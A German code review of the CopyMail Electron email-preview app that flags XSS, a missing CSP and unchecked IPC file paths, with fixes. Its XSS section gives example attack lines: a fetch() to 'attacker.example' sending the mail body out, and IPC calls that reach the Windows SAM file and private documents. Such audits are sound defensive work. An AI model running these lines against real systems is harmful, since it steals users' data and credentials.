# Code Review – CopyMail / CopyMail-v2

Review-Datum: 2026-05-04
Geprüfte Versionen: `CopyMail/` (v1) und `CopyMail-v2/` (aktiv, v1.1.0)
Stack: Vite + React 19 + TypeScript + Electron 36 + .NET-Helper (C#)

---

## Zusammenfassung

Die App ist klein, fokussiert und macht eine sinnvolle Sache: `.msg`/`.eml` einlesen, Vorschau zeigen, Inhalt + Datei in die Zwischenablage legen. Architektur (React-Renderer + Electron-Main + nativer C#-Helper für die Windows-Clipboard-Formate) ist pragmatisch und nachvollziehbar.

Die wichtigsten Befunde:

1. **Kritisch: XSS in der Mail-Vorschau.** `emailData.bodyHtml` wird ungeschützt per `dangerouslySetInnerHTML` gerendert. Eine bösartig präparierte Mail kann im Renderer JavaScript ausführen, Tracking-Pixel laden und – kombiniert mit dem `start-drag`-IPC – beliebige Dateipfade auf das System exfiltrieren. Das widerspricht direkt der Footer-Aussage „Lokal & Sicher · Keine Daten verlassen Ihren Rechner".
2. **Kritisch: Keine Content-Security-Policy.** Es gibt weder ein `<meta http-equiv="Content-Security-Policy">` noch einen `onHeadersReceived`-Hook. Bilder, Iframes und Scripts aus Mail-HTML werden gegen externe Hosts geladen.
3. **Hoch: `sandbox: false` + fehlende Navigation-Hardening** lockern die Electron-Standard-Security weiter auf.
4. **Hoch: Code-Duplikation v1 ↔ v2.** Zwei nahezu identische Projekte parallel zu pflegen erzeugt Drift (z. B. unterschiedliche `copy-to-clipboard`-Implementierung) und verwirrt Beiträge.
5. **Verschiedene Quality-of-Life- und Robustheits-Themen** (Race-Condition beim parallelen Drop, fehlende Tests, MAPI-Codepage-Annahme, externe Links ungefiltert, Helper deserialisiert mit dem deprecierten `JavaScriptSerializer`).

Verdict: **Request Changes** – Sicherheitslücken (XSS + fehlende CSP) müssen vor jedem produktiven Rollout geschlossen werden, gerade weil die App explizit als „sicher und lokal" beworben wird. Funktional ist das Konzept tragfähig.

---

## Kritische Befunde

| # | Datei | Zeile | Problem | Schweregrad |
|---|---|---|---|---|
| 1 | `CopyMail-v2/src/App.tsx` | 313–318 | Ungesicherte `dangerouslySetInnerHTML` aus Mail-HTML → XSS | Critical |
| 2 | `CopyMail-v2/index.html` | gesamt | Kein `Content-Security-Policy`-Meta | Critical |
| 3 | `CopyMail-v2/electron/main.cjs` | 22–28 | `sandbox: false`; `webSecurity` nicht explizit; keine `will-navigate`/`will-attach-webview`-Sperre | High |
| 4 | `CopyMail-v2/electron/main.cjs` | 43–46 | `shell.openExternal(url)` ohne URL-Schema-Whitelist | High |
| 5 | `CopyMail-v2/electron/main.cjs` | 61–74 | `start-drag` akzeptiert beliebige Pfade vom Renderer (kombiniert mit XSS gefährlich) | High |
| 6 | `CopyMail-v2/src/utils/EmailProcessor.ts` | 65–86 | Erzeugte HTML-Header verwenden ungeprüftes `data.bodyHtml`, `escHtml` lässt Quotes intakt | High |
| 7 | `CopyMail-v2/native/.../Program.cs` | 30 | `JavaScriptSerializer` ist seit Jahren deprecated und limitiert (kein UTF-8-Validierungs-Fallback, kein Limit) | Medium |
| 8 | `CopyMail-v2/native/.../Program.cs` | 24–28 | `Console.OpenStandardInput` ohne Größenbegrenzung → potentielle DoS via beliebig grosses JSON | Medium |
| 9 | `CopyMail/electron/main.cjs` | 71–103 | Veraltete v1-Implementierung schreibt Pfad mit `clipboard.writeBuffer('FileNameW', …)` aber Outlook erkennt das *nicht* als Anhang → war Anlass für v2; v1 sollte aus dem Repo verschwinden | Medium |
| 10 | `CopyMail-v2/src/App.tsx` | 41–67 | Race-Condition beim schnellen Hintereinander-Drop – ältere Verarbeitung kann jüngeren State überschreiben | Medium |

### 1. XSS in der Mail-Vorschau

```tsx
// CopyMail-v2/src/App.tsx:313–318
<div
  className="mail-body"
  dangerouslySetInnerHTML={{
    __html: emailData.bodyHtml || emailData.body.replace(/\n/g, '<br>')
  }}
/>
```

Probleme:

- `emailData.bodyHtml` stammt direkt aus Drittinhalt (Mail-Sender). Mail-HTML enthält in der Praxis: `<script>`, `onerror=`, `<img src="https://tracker">`, Data-URIs, `<iframe>`, `<form action="https://attacker">`. Im Electron-Renderer mit `nodeIntegration:false` und `contextIsolation:true` kann zwar nicht direkt `require('fs')`, aber:
  - `window.electronAPI.copyToClipboard({ filePath: 'C:\\Windows\\System32\\config\\SAM' })` ist erreichbar.
  - `window.electronAPI.startDrag('C:\\Users\\…\\private.docx')` ist erreichbar.
  - `fetch('https://attacker.example/?b=' + btoa(document.body.innerText))` läuft ohne CSP problemlos – Inhalt der Mail verlässt den Rechner.
- Der Plain-Text-Fallback ist ebenfalls unsicher: `body.replace(/\n/g, '<br>')` *escapet kein* `<` / `>` / `&`. Mail-Body mit `<script>` gelangt 1:1 ins DOM.

Empfohlene Behebung:
1. Sanitizer einsetzen, z. B. **DOMPurify**:
   ```ts
   import DOMPurify from 'dompurify';
   const safeHtml = DOMPurify.sanitize(emailData.bodyHtml ?? '', {
     FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
     FORBID_ATTR: ['onerror', 'onload', 'onclick', 'srcset'],
     ALLOWED_URI_REGEXP: /^(?:cid|data:image\/(png|gif|jpe?g|webp);base64,)/,
   });
   ```
2. Plain-Text-Pfad mit `escHtml` umschließen.
3. Externe Bilder optional standardmäßig blockieren (CSP `img-src 'self' data: cid:`), mit Opt-in-Schalter „externe Bilder anzeigen".

### 2. Fehlende Content-Security-Policy

`CopyMail-v2/index.html` hat keine CSP. Empfohlen für die Renderer-HTML:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: blob:;
               connect-src 'self';
               frame-src 'none';
               object-src 'none';
               base-uri 'none';">
```

Zusätzlich im Main-Prozess `session.defaultSession.webRequest.onHeadersReceived` setzen, damit auch `loadFile` mit dem CSP-Header geliefert wird (Meta-Tag wird in manchen `file://`-Setups ignoriert).

### 3. Electron-Hardening

```js
// electron/main.cjs:22–28
webPreferences: {
  preload: path.join(__dirname, 'preload.cjs'),
  contextIsolation: true,
  nodeIntegration: false,
  sandbox: false,            // <- aktivieren
  // fehlt:
  // webSecurity: true,
  // allowRunningInsecureContent: false,
  // disableBlinkFeatures: 'Auxclick',
}
```

Plus diese Listener im Main, gemäß Electron Security Checklist:

```js
mainWindow.webContents.on('will-navigate', (e) => e.preventDefault());
mainWindow.webContents.on('will-attach-webview', (e) => e.preventDefault());
mainWindow.webContents.setWindowOpenHandler(({ url }) => {
  try {
    const u = new URL(url);
    if (u.protocol === 'http:' || u.protocol === 'https:') {
      shell.openExternal(url);
    }
  } catch { /* ignore */ }
  return { action: 'deny' };
});
```

Aktuell wird `shell.openExternal(url)` für *jeden* `window.open(...)`-Aufruf ohne Schema-Prüfung getriggert; ein `javascript:`/`file:`-URL aus Mail-HTML würde direkt an `openExternal` durchgereicht.

### 4. `start-drag`-IPC ohne Pfad-Whitelist

```js
ipcMain.on('start-drag', (event, filePath) => {
  const absolutePath = path.resolve(filePath);
  if (!fs.existsSync(absolutePath)) return;
  …
  event.sender.startDrag({ file: absolutePath, icon });
});
```

In Kombination mit XSS kann der Renderer beliebige Pfade „greifbar" machen. Empfehlung: Im Main-Prozess die Menge gültiger Drag-Quellen tracken (z. B. die zuletzt im FilePicker bestätigte/gedragte Datei) und nur Pfade aus dieser Whitelist akzeptieren.

### 5. v1- vs. v2-Drift

`CopyMail/electron/main.cjs` benutzt für `copy-to-clipboard` noch das alte `clipboard.writeBuffer('FileNameW', …)` plus `text/uri-list`. v2 ersetzt das korrekt durch den C#-Helper, weil Outlook & Co. den FileNameW-Hack nicht zuverlässig akzeptieren. Empfehlung:

- v1 archivieren (separater Branch, Tag `legacy/v1`) und aus `main` entfernen, damit Beiträge nicht in der falschen Codebasis landen.
- Oder explizit als Dokumentation kennzeichnen (`README.md` im Wurzelverzeichnis).

---

## Verbesserungsvorschläge nach Kategorie

### Funktion / UX

| # | Datei | Vorschlag |
|---|---|---|
| F1 | `App.tsx` | Beim Reset oder neuem File `copyMode` auf `text` zurücksetzen, falls neuer File keinen Pfad liefert. |
| F2 | `App.tsx` | `useEffect`-Promise (`getAlwaysOnTop().then(...)`) ein `.catch` ergänzen, sonst „unhandled rejection" wenn IPC fehlschlägt. |
| F3 | `App.tsx` | Bei Drop einer nicht unterstützten Datei *vor* dem `arrayBuffer()` validieren (Endung & Größe), spart bei 100 MB-Dateien Sekunden. |
| F4 | `App.tsx` | Bewusster Status „Browser-Modus" (z. B. kleines Badge), wenn `electronAPI` fehlt – Drag/Datei-Modus sind sonst stumm deaktiviert. |
| F5 | `App.tsx` | „Datei"-Modus disabled-Tooltip nennt den Grund („Im Browser-Modus oder ohne lokalen Pfad nicht verfügbar"). |
| F6 | `App.tsx` | Race-Schutz: Innerhalb `handleFile` einen Request-Counter bzw. `AbortController` führen, damit nur das letzte Drop-Ergebnis State setzt. |
| F7 | `App.tsx` | Footer-Versionsnummer aus `package.json` ziehen, statt Hardcoding `v1.1`. |
| F8 | `EmailProcessor.ts` | `to`-Berechnung gibt bei leerer Liste „Unbekannt" zurück; UI zeigt dann Zeile „An: Unbekannt", was irritiert – besser ganz ausblenden (ist im JSX schon mit `emailData.to && (...)`, aber „Unbekannt" ist truthy). |
| F9 | `EmailProcessor.ts` | Für plain-text Bodies in HTML korrekt mit `<pre>` arbeiten oder konsistent ein `<p>`-Layout mit `white-space: pre-wrap` – aktuelle `<p>`-Konstruktion bricht Tabellen-/Codeblöcke. |
| F10 | `EmailProcessor.ts` | Falls `bodyHtml` schon `<html>/<head>/<body>` enthält (typisch bei Outlook), Body extrahieren statt das ganze Dokument in ein `<div>` zu wrappen – verhindert verschachtelte ungültige HTML beim Einfügen in Word/Outlook. |
| F11 | `MsgParser.ts` | Codepage für STRING8 nicht hardcoden auf `windows-1252`, sondern `PR_INTERNET_CPID` (0x3FDE) bzw. `PR_MESSAGE_CODEPAGE` (0x3FFD) auswerten und mit `TextDecoder('windows-1250')`/`koi8-r`/etc. dekodieren. |
| F12 | `MsgParser.ts` | Bei Adressen den `PR_SENDER_EMAIL_ADDRESS` mit `PR_SENDER_ADDRTYPE` (`EX` vs. `SMTP`) unterscheiden – bei Exchange-Adressen ist heute oft eine X.400-DN drin, keine SMTP-Adresse. Optional `PR_SENDER_SMTP_ADDRESS` (0x5D01) bevorzugen. |
| F13 | `MsgParser.ts` | Für Datumsfeld zusätzlich `PR_PROVIDER_SUBMIT_TIME` und Header-Stream prüfen – manche MSG haben kein `PR_CLIENT_SUBMIT_TIME`. |
| F14 | `MsgParser.ts` | Größe der Mail-Datei vorab limitieren (z. B. 100 MB), `arrayBuffer()` belegt sonst RAM 1:1. |
| F15 | `Program.cs` | Anhang einer einzelnen Datei reicht – aber Helper könnte konzeptionell auch *mehrere* `FileDrop`-Einträge anbieten (z. B. mehrere ausgewählte Mails). |
| F16 | `App.tsx` | Tastatur-Shortcut zum Kopieren (`Ctrl+C` global) anbieten, wenn Vorschau sichtbar. |

### Architektur / Security

| # | Datei | Vorschlag |
|---|---|---|
| S1 | App-weit | DOMPurify (oder vergleichbar) integrieren, sowohl für die Vorschau als auch für `headerHtml + bodyHtml`, das auf die Zwischenablage geht. |
| S2 | `electron/main.cjs` | CSP via `session.defaultSession.webRequest.onHeadersReceived`. |
| S3 | `electron/main.cjs` | `sandbox: true`, Preload entsprechend in Sandbox-kompatible Form (kein `webUtils`-Direkt-Import nötig, `ipcRenderer` reicht). |
| S4 | `electron/main.cjs` | `webContents.on('will-navigate', e => e.preventDefault())`, `setWindowOpenHandler` mit Schema-Whitelist (`http(s)`-only). |
| S5 | `electron/main.cjs` | `start-drag`/`copy-to-clipboard` Pfade gegen Whitelist (zuletzt geöffnete Mail) prüfen. |
| S6 | `Program.cs` | `JavaScriptSerializer` → `System.Text.Json` (in net48 via NuGet `System.Text.Json` oder Newtonsoft). |
| S7 | `Program.cs` | Stdin-Größe begrenzen (z. B. 25 MB), sonst kann ein lokal kompromittierter Aufrufer den Helper hängenlassen / OOMen. |
| S8 | `Program.cs` | Für die HTML-CF-Berechnung Tests hinterlegen (Word/Outlook akzeptieren falsche Offsets stillschweigend mit komischen Renderings). |
| S9 | `build.ps1` | csc.exe-Pfad nicht hardcoden; `dotnet build` oder MSBuild-Lookup verwenden, damit Build auf Build-Servern ohne Framework-SDK funktioniert. |
| S10 | `Start-CopyMail-v2.ps1` + `.vbs` | Diese Dev-Starter sollten *nicht* in der NSIS-Installation landen. Aktuell sind sie im Repo, im NSIS-Build aber nicht als Resource markiert – verifizieren. Endnutzer sollte ausschließlich die installierte `.exe` starten. |

### Code-Qualität / Wartbarkeit

| # | Datei | Vorschlag |
|---|---|---|
| Q1 | `package.json` | Versionen prüfen: `typescript ~6.0.2`, `eslint ^10.2.1`, `vite ^8.0.10`. Per Mai 2026 sind das je nach Roadmap noch keine Stable-Releases – ggf. lockfile-Drift / Pre-Releases. Pinnt eure Toolchain auf bekannt-stabile Majors. |
| Q2 | Repo | Tests einführen. Vorschlag: **Vitest** für `EmailProcessor`/`MsgParser` mit Sample-`.msg`/`.eml`-Fixtures (inkl. UTF-16, Anhängen, leerem Body, HTML-only). |
| Q3 | Repo | CI hinzufügen: `npm ci && npm run lint && npm run build` als GitHub-Action; optional `electron-builder --dir` als Smoke-Build. |
| Q4 | `electron/main.cjs` | `console.log`-Debug-Ausgaben (v1) entfernen oder hinter `DEBUG`-Flag verstecken. v2 hat das schon teilweise gemacht – konsistent halten. |
| Q5 | `App.tsx` | Doppelter Code mit der v1-App: einmal in eine wiederverwendbare Komponente extrahieren, falls beide Versionen bestehen bleiben sollen. Sonst v1 löschen. |
| Q6 | `App.tsx` | `(file as File & { path?: string }).path` ist seit Electron 32 deprecated; kanonisch ist `webUtils.getPathForFile(file)`. Den Fallback weglassen, sobald nur noch Electron ≥ 32 supportet wird. |
| Q7 | `electron/preload.cjs` | `getPathForFile` synchron ist OK, aber im v1-`App.tsx` wird er fälschlich `await`ed (`await (window as any).electronAPI.getPathForFile(file)`). Inkonsistenz beheben. v2 macht es korrekt synchron. |
| Q8 | `electron.d.ts` | Statt `window.electronAPI?` mit `!!`-Cast → typed Helper-Funktion `function ipc(): ElectronAPI | null`. Reduziert die `!`-Non-Null-Asserts in `App.tsx`. |
| Q9 | `MsgParser.ts` | DataView-Konstruktor mit explizitem `byteOffset/byteLength` ist redundant, da `Uint8Array.slice()` ein neues Buffer liefert; vereinfachbar. |
| Q10 | `EmailProcessor.ts` | `escHtml` sollte auch `"`/`'` escapen, sobald der String je in ein Attribut wandert. |
| Q11 | `EmailProcessor.ts` | `paragraphs.map(...).join('<br>')` erzeugt zwei Zeilenumbrüche zwischen `<p>`-Blöcken (Block-Element + extra `<br>`). `join('')` reicht. |
| Q12 | `App.tsx` | `setTimeout(() => copyBtnRef.current?.focus(), 100)` ist fragil. Besser per `useEffect` auf `formattedContent` reagieren. |
| Q13 | Repo | `node_modules/` ist via `.gitignore` ausgeschlossen ✓ – sicherstellen, dass es trotzdem nicht in den Releases landet (electron-builder-`files`-Liste). |
| Q14 | Repo | Beide `README.md` sind unverändert die Vite-Template-Defaults. Echte Doku (Build, Dev, Helper-Build, Architektur, Sicherheitsmodell) ergänzen. |
| Q15 | `package.json` | `description` ist gut, `author`, `license`, `repository` fehlen. |

---

## Was gut ist

- **Saubere Trennung Renderer / Main / Helper.** Die Idee, das eigentlich heikle Windows-Clipboard-Mehrformat-Schreiben in einen kleinen, einmal-aufgerufenen C#-Prozess auszulagern, ist solide und vermeidet die Fragilität des `clipboard.writeBuffer('FileNameW', …)`-Hacks aus v1.
- **`contextIsolation: true` + `nodeIntegration: false` + Preload-Bridge** sind richtig gesetzt. Der `webUtils.getPathForFile`-Pfad ist die korrekte zukunftssichere API.
- **MSG-Parser komplett im Browser/Renderer**, ohne Node-Dependencies. Sauber strukturiert mit Magic-Check, FAT-Lesung, Mini-FAT und entryMap. Sehr lesbar.
- **UI** ist konsistent, German-First, mit guten Touch-Punkten (Drag-Handle für Datei, Always-on-Top, Reset, Copy-Modi). Framer-Motion-Übergänge dezent.
- **Fehlerbehandlung** im `handleFile`-Catch reicht etwas weiter als nur „Fehler"; lokalisierte Meldung wird gezeigt.
- **`copy-to-clipboard` in v2** liefert ein strukturiertes Ergebnis (`success`, `partial`, `message`) statt nur Boolean – gute Basis, wird auch im UI genutzt.
- **`getMailIconPath`** mit Fallback-Liste ist robust gegen Pack-Layout-Unterschiede (asar vs. extraResources).
- **`oneClick`-NSIS** und `perMachine: false` sind sinnvolle Defaults für Endnutzer-Installation.

---

## Verdict

**Request Changes.** Funktional ist die App nahe dran, aber die Sicherheits-Aussagen im Footer („Lokal & Sicher · Keine Daten verlassen Ihren Rechner") sind beim aktuellen Stand nicht haltbar, solange Mail-HTML ungesichert in den Renderer gerendert wird und keine CSP existiert. Sobald Punkte 1–4 (XSS, CSP, Sandbox/Navigation, Pfad-Whitelist) adressiert sind, ist die App aus Sicherheitssicht unbedenklich, und die übrigen Punkte sind klassische Verbesserungen.

### Empfohlene Reihenfolge

1. DOMPurify integrieren + `escHtml` im Plain-Text-Pfad anwenden (ein Vormittag Arbeit, blockerlos).
2. CSP im `index.html` + onHeadersReceived (eine Stunde).
3. `sandbox: true`, `will-navigate`-Sperre, `setWindowOpenHandler` mit Schema-Whitelist (eine Stunde).
4. Pfad-Whitelist für `start-drag` und `copy-to-clipboard` im Main (zwei Stunden).
5. v1-Verzeichnis entfernen oder archivieren (`legacy/`-Branch).
6. Vitest-Setup mit ein paar `.msg`/`.eml`-Fixtures (halber Tag).
7. CI-Workflow (`lint` + `build`).
8. Dokumentations-README schreiben.
